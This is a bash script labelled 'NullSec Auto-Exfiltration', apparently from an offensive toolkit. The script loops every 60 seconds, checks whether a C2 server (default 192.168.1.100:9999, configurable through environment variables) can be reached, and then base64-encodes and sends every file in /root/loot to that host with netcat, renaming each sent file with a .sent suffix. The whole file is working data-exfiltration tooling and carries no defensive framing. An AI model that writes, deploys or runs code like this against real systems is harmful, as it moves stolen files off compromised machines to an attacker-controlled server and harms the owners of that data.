#!/bin/bash
# NullSec Auto-Exfiltration
# Automatically exfils loot when network available

LOOT_DIR="/root/loot"
EXFIL_SERVER="${NULLSEC_C2:-192.168.1.100}"
EXFIL_PORT="${NULLSEC_PORT:-9999}"

echo "[*] NullSec Auto-Exfil"
echo "[*] Server: $EXFIL_SERVER:$EXFIL_PORT"

check_network() {
    ping -c 1 $EXFIL_SERVER &>/dev/null
    return $?
}

exfil_file() {
    local file="$1"
    local name=$(basename "$file")
    
    # Base64 encode and send
    base64 "$file" | nc $EXFIL_SERVER $EXFIL_PORT
    
    if [[ $? -eq 0 ]]; then
        echo "[+] Exfiltrated: $name"
        # Mark as sent
        mv "$file" "${file}.sent"
    fi
}

# Main loop
while true; do
    if check_network; then
        # Find and exfil new loot
        find "$LOOT_DIR" -type f ! -name "*.sent" | while read file; do
            exfil_file "$file"
        done
    fi
    sleep 60
done
